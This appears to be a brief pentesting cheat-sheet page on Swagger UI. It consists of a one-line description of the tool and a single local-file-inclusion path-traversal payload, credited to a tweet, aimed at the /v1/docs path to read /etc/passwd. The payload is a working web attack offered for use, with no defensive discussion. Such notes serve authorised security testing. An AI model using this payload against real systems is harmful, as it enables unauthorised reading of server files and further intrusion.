---
description: Pentesting Swagger UI
---

# Swagger UI

> Swagger UI allows to visualize and interact with the API's resources without having any of the implementation logic in place.

#### Swagger UI LFI Injection

{% code overflow="wrap" %}
```bash
#https://twitter.com/0x0SojalSec/status/1569218639748026368
/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
```
{% endcode %}
